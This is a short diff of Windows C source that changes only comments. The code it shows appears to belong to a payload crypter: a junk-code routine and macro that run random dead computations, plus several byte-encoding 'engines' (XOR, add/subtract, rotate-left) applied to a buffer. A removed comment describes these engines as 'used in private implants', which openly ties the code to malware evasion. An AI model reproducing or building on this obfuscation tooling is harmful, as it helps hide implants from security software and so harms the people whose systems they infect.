@@ -7,7 +7,7 @@
 
 typedef void(*ENGINE)(BYTE*, DWORD, BYTE);
 
-// Heavy junk (pure C — no __asm)
+// Heavy junk.......
 static void junk() {
     volatile DWORD a = 0xDEADBEEF;
     a ^= GetTickCount();
@@ -21,7 +21,7 @@ static void junk() {
 
 #define JUNK do { for(int i=0;i<5+rand()%10;i++) junk(); } while(0)
 
-// 5 ELITE engines (real ones used in private implants)
+// 5 engines........
 static void eng_xor(BYTE* p, DWORD s, BYTE k)      { for(DWORD i=0;i<s;i++) p[i]^=k; }
 static void eng_add(BYTE* p, DWORD s, BYTE k)      { for(DWORD i=0;i<s;i++) p[i]+=k; for(DWORD i=0;i<s;i++) p[i]-=k; }
 static void eng_rol(BYTE* p, DWORD s, BYTE k)      { for(DWORD i=0;i<s;i++) p[i]=_rotl8(p[i],k&7); }
